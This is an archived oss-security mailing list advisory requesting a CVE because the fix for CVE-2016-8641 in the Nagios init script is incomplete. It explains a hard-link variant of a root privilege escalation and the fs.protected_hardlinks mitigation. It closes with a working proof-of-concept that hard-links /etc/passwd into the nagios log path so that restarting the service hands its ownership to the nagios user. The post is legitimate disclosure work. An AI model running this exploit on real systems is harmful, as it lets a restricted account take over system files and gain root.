X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3285" "Friday" "30" "December" "2016" "13:37:37" "-0500" "Michael Orlitzky" "michael@orlitzky.com" "<e5e71351-83ac-5324-7f70-ad40ef5bf9be@orlitzky.com>" "96" "[oss-security] CVE request: Nagios: Incomplete fix for CVE-2016-8641" nil nil nil "12" "2016123018:37:37" "[oss-security] CVE request: Nagios: Incomplete fix for CVE-2016-8641" (number mark "U       michael@orli Dec 30   96/3285  " thread-indent "\"[oss-security] CVE request: Nagios: Incomplete fix for CVE-2016-8641\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 20392 invoked by uid 550); 30 Dec 2016 19:07:43 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3711 invoked from network); 30 Dec 2016 18:38:07 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=orlitzky.com; s=mail2;
	t=1483123075; bh=la/cEcF9atjjFi/ouUs8QYKEbg1nKISOyCtQtW10iT0=;
	h=To:From:Subject:Date;
	b=mVNOTxnXwqdki07FAu+vOfVO5fD2+vY9/UT8TDGc5nc9p6qsM5kfbTd6/VE4X5npx
	 SNGosqyxd1NYuZMJyLMuYluhe+BbhCzUb3OYkbrBbC7/VLuil67XHTWpd4ZFWS3nJp
	 5pLv7sM2CuvdHwFplp5PFHMRM1XPeOjUt26ktY7Q=
To: oss-security@lists.openwall.com
From: Michael Orlitzky <michael@orlitzky.com>
Message-ID: <e5e71351-83ac-5324-7f70-ad40ef5bf9be@orlitzky.com>
Date: Fri, 30 Dec 2016 13:37:37 -0500
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
 Thunderbird/45.5.1
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 7bit
Subject: [oss-security] CVE request: Nagios: Incomplete fix for CVE-2016-8641

Author: Michael Orlitzky (michael@orlitzky.com)
Software Name: Nagios
Vendor Name: Nagios Enterprises, LLC
Type of vulnerability: root privilege escalation
Reported to vendor: 2016-12-26

Exploit Vector
--------------
The init script for Nagios calls "chown" on a path under the control of
Nagios's (usually restricted) user. CVE-2016-8641 describes an attack
wherein that restricted user replaces the aforementioned path with a
symlink. The root user (via the init script) will -- the next time
Nagios is started -- give ownership of the symlink's target to Nagios's
user. In that manner, the restricted Nagios user can gain root.

An identical attack not addressed by CVE-2016-8641 works with hard
links. As long as no special kernel protections are in place, the
restricted Nagios user can replace the path (in the directory he
controls) by a hard-link. The call to "chown" in the init script affects
the target of that hard link.


Attack outcome
--------------
The restricted Nagios user gains control of any file on the same
filesystem as its runtime directory.


Affected versions
-----------------
Versions 4.2.2 and older are affected by the symlink attack of
CVE-2016-8641; those and newer versions, up to the current version
4.2.4, are affected by the hard-link attack.


Source code
-----------
The fix for CVE-2016-8641 is contained in the following commit, which
prohibits "chown" from following symlinks only (via the --no-dereference
flag):

https://github.com/NagiosEnterprises/nagioscore/commit/f2ed227673d3b2da643eb5cad26b2d87674f28c1


Mitigation
----------
The creation of the problematic hard link is blocked if the user has the
fs.protected_hardlinks sysctl enabled. It is *not enabled* by default in
the vanilla Linux kernel, but some distributions patch that default.

It can be enabled with (as root):

  sysctl -w fs.protected_hardlinks=1

The grsecurity patches for the Linux kernel provide similar protection
when CONFIG_GRKERNSEC_LINK=y.


Exploit
-------

The following commands should grant ownership of /etc/passwd to the new,
restricted "nagios" user. Beware that in order for the attack to work,
some important (but non-default) sysctls are disabled. The two paths
/etc/passwd and /usr/local/nagios must live on the same filesystem.
Afterwards you should re-enable the two sysctls (if they were enabled to
begin with), clean up /usr/local, and remove the "nagios" user.

  sudo mkdir -p /usr/local/tmp \
                /usr/local/etc/init.d \
                /usr/local/etc/apache2
  sudo chmod 777 /usr/local/tmp

  wget
https://github.com/NagiosEnterprises/nagioscore/archive/release-4.2.4.tar.gz
  tar -xf release-4.2.4.tar.gz
  rm release-4.2.4.tar.gz
  cd nagioscore-release-4.2.4
  sudo useradd nagios -m -d /home/nagios
  ./configure --with-nagios-user=nagios \
              --with-temp-dir=/usr/local/tmp \
              --with-init-dir=/usr/local/etc/init.d \
              --with-httpd-conf=/usr/local/etc/apache2
  make all
  sudo make install
  sudo make install-config
  sudo make install-init
  sudo sysctl -w kernel.grsecurity.linking_restrictions=0
  sudo sysctl -w fs.protected_hardlinks=0

  sudo -u nagios -s
  ln -f /etc/passwd /usr/local/nagios/var/nagios.log
  exit

  sudo /usr/local/etc/init.d/nagios start
  ls /etc/passwd
